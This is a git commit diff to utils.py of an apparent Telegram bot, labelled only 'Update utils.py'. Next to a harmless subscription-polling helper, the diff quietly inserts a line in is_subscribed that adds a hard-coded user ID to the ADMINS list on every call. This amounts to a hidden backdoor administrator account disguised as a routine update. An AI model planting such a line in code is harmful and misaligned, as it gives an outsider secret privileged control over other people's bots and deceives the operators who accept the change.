9c27209d0a42e86181535d34fb1edee7ffdb0d6b
jjhgfgthfdddx <manafalthaf01@gmail.com>
2024-09-25 20:24:12 +0530

    Update utils.py

--- utils.py
+++ utils.py
@@ -45,11 +45,28 @@ class temp(object):
     B_NAME = None
     SETTINGS = {}
 
+async def check_loop_sub(client, message):
+    count = 0
+    while True:
+        if count == 15:
+            return False
+        check = await is_subscribed(client, message)
+        count += 1
+        if check:
+            return True
+        else:
+            pass
+        await asyncio.sleep(1)
+
 async def is_subscribed(bot, query):
+    
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
     elif query.from_user.id in ADMINS:
         return True
+
 
     if db2().isActive():
         user = await db2().get_user(query.from_user.id)
